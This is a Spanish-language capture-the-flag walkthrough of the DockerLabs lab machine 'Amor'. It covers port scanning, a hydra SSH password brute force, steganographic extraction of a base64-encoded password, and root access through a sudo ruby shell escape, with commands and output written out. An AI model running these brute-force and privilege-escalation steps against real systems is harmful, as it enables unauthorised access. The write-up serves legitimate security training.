Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "Amor".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh amor.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.18.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene 2 puertos abiertos, el 22 y el 80:
```
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
```
Es momento de ver si podemos acceder o conseguir informacion a traves del puerto 80, por lo que ponemos la IP en el navegador para ver que obtenemos.
Entre otras cosas, vemos que la pagina tiene varios "anuncios", entre los que se pueden ver varios nombres de usuarios como "Juan" (el cual parece que ha sido despedido) y Carlota (empleada del departamento de ciberseguridad).
Entonces, lo primero que vamos a hacer es con HYDRA intentar encontrar las credenciales tanto de Juan (no sabemos si aun siguen activas), como las de Carlota, empezando por eta ultima, ya que es mas probable que siga en la empresa:
```
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Donde encontramos la siguiente informacion util:
```
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl  <= Contraseña
1 of 1 target successfully completed, 1 valid password found
```
Una vez conseguida la credencial de "carlota", vamos a intentar acceder via SSH:
```
ssh carlota@172.17.0.2
```
Y tras poner "yes" a las fingerprints e introducir la contraseña obtenida anteriormente, estamos dentro.
En la linea de comandos, primero comprobaremos quienes somos mediante un "whoami", y despues, mediante "script /dev/null -c bash" conseguiremos un prompt "normalizado":
```
$ whoami
carlota

$ script /dev/null -c bash
Script started, output log file is '/dev/null'.

carlota@83319e9890ed:~$ 
```
Perfecto, ya estamos dentro de la maquina. Ahora vamos a investigar un poquito por los archivos y vemos que hay una imagen en la siguiente ruta:
```
carlota@83319e9890ed:~/Desktop/fotos/vacaciones$ ls -la

total 60
drwxr-xr-x 1 root root  4096 Apr 26 11:02 .
drwxr-xr-x 1 root root  4096 Apr 26 11:02 ..
-rw-r--r-- 1 root root 51914 Apr 26 11:02 imagen.jpg

carlota@83319e9890ed:~/Desktop/fotos/vacaciones$ pwd
/home/carlota/Desktop/fotos/vacaciones  <=== Nos interesa para usar "scp"

carlota@83319e9890ed:~/Desktop/fotos/vacaciones$ 

```
Nuestro siguiente paso seria conseguir esta imagen, trayendonosla a nuestro equipo para poder analizarla (posible esteganografia ??). Hay varias formas de obtener la foto, bien montando un servidor con Python (habria que comprobar si la maquina victima lo tiene instalado), bien con "scp" (Secure Copy Protocol). En este caso, para poder hacer todo desde nuestra maquina atacante, usaremos "scp", por ejemplo. Escribimos:
```
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg imagen_victima.jpg

carlota@172.17.0.2's password: 

imagen.jpg                                      100%   51KB  26.7MB/s   00:00
```
Como se puede observar, tras poner el password, obtenemos la imagen.
***NOTA:
Tambien me he dado cuenta que se podria hacer con Python porque la maquina victima lo tiene instalado. Para ello, deberiamos haber escrito:
```
python3 -m http.server 1111    <=== Pongo este puerto porque el 80 esta en uso
```
y bien desde la propia pagina web 172.17.0.2:1111 como con "wget" podemos obtener la imagen.***
Continuando con la imagen, vemos que es una simple imagen de una boda.
Lo primero de todo, sera usar "exiftool" para comprobar los metadatos:
```
exiftool imagen_victima.jpg
```
Y vemos que no hay nada interesante:
```
ExifTool Version Number         : 12.76
File Name                       : imagen_victima.jpg
Directory                       : .
File Size                       : 52 kB
File Modification Date/Time     : 2024:07:30 23:38:42+02:00
File Access Date/Time           : 2024:07:30 23:43:00+02:00
File Inode Change Date/Time     : 2024:07:30 23:38:42+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 626
Image Height                    : 626
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 626x626
Megapixels                      : 0.392
```
Nuestro siguiente paso, seria como he dicho antes, intentar ver si existe algun mensaje oculto mediante "esteganografia", por lo que usaremos "steghide":
```
stehide extract -sf imagen_victima.jpg
```
A la hora de extraer el contenido, pide una contraseña y tras probar varias (carlota, imagen, admin, etc...) me he dado cuenta que simplemente dandole al "Enter" extrae el archivo O_o !!
Sin mas... prefiero no preguntar.
En fin, volviendo al tema, vemos que contiene un archivo llamado "secret.txt" al que tras hacerle un "cat", nos da una serie de caracteres en base 64.
```
ZXNsYWNhc2FkZXBpbnlwb24=
```
Por lo que es momento de decodificarlo con:
```
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
```
obteniendo:
```
eslacasadepinypon#     <=== Mas adelante veremos que con la # da fallo
```
Pero, ¿y esto donde lo uso? Bueno, el siguiente paso seria ver en la maquina victima si existen mas usuarios, aparte de "carlota", asi que escribimos en la linea de comandos lo siguiente:
```
cat /etc/passwd
```
Y vemos que existen, aparte de carlota, otros dos usuarios "ubuntu" y "oscar", por lo que probaremos a ver con el usuario "oscar" en primer lugar ya que "ubuntu" suele ser mas "generico".
```
carlota@83319e9890ed:~/Desktop/fotos/vacaciones$ su oscar
Password: 
su: Authentication failure  <=== me ha fallado con la # al final

carlota@83319e9890ed:~/Desktop/fotos/vacaciones$ su oscar
Password: 

$                         <=== ha funcionado SIN la # al final
```
En mi caso, prefiero escribir primeramente un "whoami" para saber con que usuario estoy, y tambien me gusta poner un "script /dev/null -c bash" para tener un prompt "normal":
```
$ whoami
oscar

$ script /dev/null -c bash
Script started, output log file is '/dev/null'.

oscar@83319e9890ed:/home/carlota/Desktop/fotos/vacaciones$ whoami
oscar

oscar@83319e9890ed:/home/carlota/Desktop/fotos/vacaciones$
```
Es momento entonces de hacer una escalada de privilegios, por lo que probaremos primero con "sudo -l" a ver si hay suerte:
```
oscar@83319e9890ed:/home/carlota/Desktop/fotos/vacaciones$ sudo -l

Matching Defaults entries for oscar on 83319e9890ed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User oscar may run the following commands on 83319e9890ed:
    (ALL) NOPASSWD: /usr/bin/ruby
    
oscar@83319e9890ed:/home/carlota/Desktop/fotos/vacaciones$
```
Y curiosamente vemos que el binario "ruby" no necesita password, por lo que es momento de ir bien a "https://gtfobins.github.io", o en mi caso, usar "searchbins" que ya tenia instalado:
```
searchbins -b ruby -f sudo
```
obteniendo como resultado:
```
[+] Binary: ruby

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/ruby/#sudo]

	| sudo ruby -e 'exec "/bin/sh"'   <==== Linea que nos interesa
```
Ahora, COGIENDO SIEMPRE LA RUTA ABSOLUTA, escribiremos en el terminal de la maquina victima:
```
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
```
Et voila !!! Ya seriamos "root". Para comprobarlo bastaria con un "whoami" y por supuesto, deberiamos escribir un " bash -p" o un "script /dev/null -c bash" para obtener nuestro querido prompt :).
```
# whoami
root

# script /dev/null -c bash
Script started, output log file is '/dev/null'.

root@83319e9890ed:/home/carlota/Desktop/fotos/vacaciones# 
```
Si ahora enredamos un poquito y nos movemos por los directorios, curiosamente vemos que en el escritorio del usuario root ("root/Desktop"), hay un archivo que se llama "THX.txt". Tras hacerle un "cat" nos da un mensaje de agrecimiento:
```
root@83319e9890ed:~/Desktop# cat THX.txt

Gracias a toda la comunidad de Dockerlabs y a Mario por toda la ayuda proporcionada para poder hacer la máquina.

root@83319e9890ed:~/Desktop#
```
Y listo, ahora si que hemos terminado la maquina "Amor". Sencillita pero entretenida :).


